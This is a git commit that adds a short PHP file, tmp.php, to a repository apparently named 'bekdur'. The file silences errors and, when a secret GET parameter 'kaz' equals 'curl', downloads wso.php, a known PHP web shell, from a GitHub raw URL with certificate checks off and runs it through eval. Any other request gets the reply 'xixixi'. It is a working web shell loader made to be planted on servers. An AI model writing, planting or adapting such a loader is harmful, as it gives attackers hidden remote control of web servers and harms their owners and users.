6fcb2b200ee57e5a81a60aec9084736fb16cb807
Mantodkaz <114888381+Mantodkaz@users.noreply.github.com>
2022-10-03 08:21:38 +0700

    Create tmp.php

---
+++ php/tmp.php
@@ -0,0 +1,19 @@
+<?php
+error_reporting(0);
+if($_GET['kaz'] == 'curl'){ 
+	function get_contents($url){
+  $ch = curl_init("$url");
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
+  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
+  $result = curl_exec($ch);
+  return $result;
+}
+$mantod = get_contents('https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php');
+eval('?>'.$mantod);
+	} else {
+		echo "xixixi";}
